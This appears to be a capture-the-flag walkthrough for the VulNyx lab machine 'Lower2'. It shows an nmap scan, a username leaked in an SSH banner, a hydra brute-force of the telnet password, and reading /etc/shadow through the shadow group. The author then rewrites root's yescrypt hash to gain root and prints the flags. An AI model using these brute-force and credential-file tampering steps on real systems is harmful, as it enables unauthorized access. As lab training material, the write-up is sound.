# VulNyx - Lower2

## Information

## Solution

### Enumeration
#### Nmap 
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sVC -p- -T4 10.11.5.9
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-15 18:16 +07
Nmap scan report for 10.11.5.9
Host is up (0.0018s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
23/tcp open  telnet  Netkit telnet-ssl telnetd
80/tcp open  http    nginx 1.22.1
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.22.1
MAC Address: 08:00:27:6A:68:7F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.33 seconds
```
#### Gobuster 
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ gobuster dir -u http://10.11.5.9/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.5.9/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 220557 / 220557 (100.00%)
===============================================================
Finished
===============================================================
```
### Shell
#### SSH
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ ssh root@10.11.5.9           
The authenticity of host '10.11.5.9 (10.11.5.9)' can't be established.
ED25519 key fingerprint is: SHA256:4K6G5c0oerBJXgd6BnT2Q3J+i/dOR4+6rQZf20TIk/U
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:16: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.11.5.9' (ED25519) to the list of known hosts.

###################################################
### Welcome to Brian Taylor's (b.taylor) server ###
###################################################

root@10.11.5.9: Permission denied (publickey).
```
We list the user `b.taylor` in the SSH service banner.

#### Hydra
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ hydra -l b.taylor -P /tmp/pass.txt telnet://10.11.5.9 -F -I
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-18 10:37:43
[WARNING] telnet is by its nature unreliable to analyze, if possible better choose FTP, SSH, etc. if available
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1001 login tries (l:1/p:1001), ~63 tries per task
[DATA] attacking telnet://10.11.5.9:23/
[23][telnet] host: 10.11.5.9   login: b.taylor   password: rockyou
```

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ telnet 10.11.5.9
Trying 10.11.5.9...
Connected to 10.11.5.9.
Escape character is '^]'.


lower2 login: b.taylor
Password: 
Last login: Fri May 15 23:53:17 CEST 2026 on pts/0
b.taylor@lower2:~$ id ; hostname
uid=1000(b.taylor) gid=1000(b.taylor) grupos=1000(b.taylor),42(shadow)
lower2
```
### Privilege Escalation
#### Enumeration
**Groups**
```bash
b.taylor@lower2:~$ groups
b.taylor shadow
```
The `shadow` group has direct access to the `/etc/shadow` file — where all encrypted passwords (hash) of all users in the system, including the `root` account, are stored.
**Writable Files**
```bash
b.taylor@lower2:~$ cat /etc/shadow
root:$y$j9T$RDW/7EgA4sElvqxLVk.Uo.$OmF5Lm4Ub/UeC2ua6tTQnHB07WKpYs1lOXl.lS581q8:20134:0:99999:7:::
daemon:*:19676:0:99999:7:::
bin:*:19676:0:99999:7:::
sys:*:19676:0:99999:7:::
sync:*:19676:0:99999:7:::
games:*:19676:0:99999:7:::
man:*:19676:0:99999:7:::
lp:*:19676:0:99999:7:::
mail:*:19676:0:99999:7:::
news:*:19676:0:99999:7:::
uucp:*:19676:0:99999:7:::
proxy:*:19676:0:99999:7:::
www-data:*:19676:0:99999:7:::
backup:*:19676:0:99999:7:::
list:*:19676:0:99999:7:::
irc:*:19676:0:99999:7:::
_apt:*:19676:0:99999:7:::
nobody:*:19676:0:99999:7:::
systemd-network:!*:19676::::::
messagebus:!:19676::::::
sshd:!:19676::::::
b.taylor:$y$j9T$du9sW7McN8WfjLKPRheP7/$pyE/4IrgDjurpaNzpdyxj8PYcOYyDksyYPG2rxEBxm4:20135:0:99999:7:::
telnetd-ssl:!:20134::::::
```
```bash
b.taylor@lower2:~$ ls -l /etc/shadow
-rw-rw---- 1 root shadow 749 feb 16  2025 /etc/shadow
```
We have full permission to modify this file.

##### Abuse
We see `root:$y$j9T$RDW/7EgA4sElvqxLVk.Uo.$OmF5Lm4Ub/UeC2ua6tTQnHB07WKpYs1lOXl.lS581q8:20134:0:99999:7:::`. 

`$y$` (Algorithm symbol): Indicates that this password is encrypted using the `Yescrypt` algorithm.

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ mkpasswd --method=yescrypt 55555 
$y$j9T$E0.mvSy6qdERtnyqqdjlM.$TWNp8k1GlKHGcAAVWJVJ/uHdiiy1Fx96T1NRHSpj7o/
```
```bash
b.taylor@lower2:~$ head -n1 /etc/shadow
root:$y$j9T$RDW/7EgA4sElvqxLVk.Uo.$OmF5Lm4Ub/UeC2ua6tTQnHB07WKpYs1lOXl.lS581q8:20134:0:99999:7:::
b.taylor@lower2:~$ nano /etc/shadow
b.taylor@lower2:~$ head -n1 /etc/shadow
root:$y$j9T$E0.mvSy6qdERtnyqqdjlM.$TWNp8k1GlKHGcAAVWJVJ/uHdiiy1Fx96T1NRHSpj7o/:20134:0:999999:7:::
b.taylor@lower2:~$ su - root
Contraseña: 
root@lower2:~# id ; hostname
uid=0(root) gid=0(root) grupos=0(root)
lower2
```

#### Flags
```bash
root@lower2:~# find / -name root.txt -o -name user.txt 2>/dev/null |xargs cat
235aa90b688b711a87d5d15c6e34dada
edc9f5c55af87505033a20dd41931364
```

***You are welcome!***
